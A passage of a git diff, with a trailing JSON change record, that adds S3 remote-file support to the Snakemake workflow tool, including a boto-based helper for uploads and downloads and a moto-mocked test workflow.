\"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a\/snakemake\/remote_providers\/RemoteObjectProvider.py b\/snakemake\/remote_providers\/RemoteObjectProvider.py\nnew file mode 100644\nindex 00000000..b040e87d\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a\/snakemake\/remote_providers\/S3.py b\/snakemake\/remote_providers\/S3.py\nnew file mode 100644\nindex 00000000..77b15eac\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket\/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^\/]*)\/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket\/key': %s\" %\n+                                  self.file())\ndiff --git a\/snakemake\/remote_providers\/__init__.py b\/snakemake\/remote_providers\/__init__.py\nnew file mode 100644\nindex 00000000..8b137891\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a\/snakemake\/remote_providers\/implementations\/S3.py b\/snakemake\/remote_providers\/implementations\/S3.py\nnew file mode 100644\nindex 00000000..c6cb622b\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/implementations\/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize \/ float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a\/snakemake\/rules.py b\/snakemake\/rules.py\nindex 36081672..5324eeb8 100644\n--- a\/snakemake\/rules.py\n+++ b\/snakemake\/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a\/snakemake\/workflow.py b\/snakemake\/workflow.py\nindex b035bc36..833bd907 100644\n--- a\/snakemake\/workflow.py\n+++ b\/snakemake\/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a\/tests\/test_remote\/S3Mocked.py b\/tests\/test_remote\/S3Mocked.py\nnew file mode 100644\nindex 00000000..d8cc4895\n--- \/dev\/null\n+++ b\/tests\/test_remote\/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a\/tests\/test_remote\/Snakefile b\/tests\/test_remote\/Snakefile\nnew file mode 100644\nindex 00000000..b2e1298c\n--- \/dev\/null\n+++ b\/tests\/test_remote\/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket\/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket\/out.txt .\/\")\n+\n+rule split:\n+    input: remote('test-remote-bucket\/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket\/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket\/prefix')\n+        for f in os.listdir(os.getcwd()+\"\/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket\/\"+f, \"test-remote-bucket\/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket\/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket\/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm .\/motoState.p\")\n+\n+onerror:\n+    shell(\"rm .\/motoState.p\")\n\\ No newline at end of file\ndiff --git a\/tests\/test_benchmark\/expected-results\/test.benchmark.json b\/tests\/test_remote\/__init__.py\nsimilarity index 100%\nrename from tests\/test_benchmark\/expected-results\/test.benchmark.json\nrename to tests\/test_remote\/__init__.py\ndiff --git a\/tests\/test_remote\/expected-results\/out.txt b\/tests\/test_remote\/expected-results\/out.txt\nnew file mode 100644\nindex 00000000..818b3c52\n--- \/dev\/null\n+++ b\/tests\/test_remote\/expected-results\/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/test_remote\/test.txt b\/tests\/test_remote\/test.txt\nnew file mode 100644\nindex 00000000..818b3c52\n--- \/dev\/null\n+++ b\/tests\/test_remote\/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/tests.py b\/tests\/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd1801..6b53573a\n--- a\/tests\/tests.py\n+++ b\/tests\/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n","files":{"\/snakemake\/dag.py":{"changes":[{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]},{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]},"\/snakemake\/io.py":{"changes":[{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def 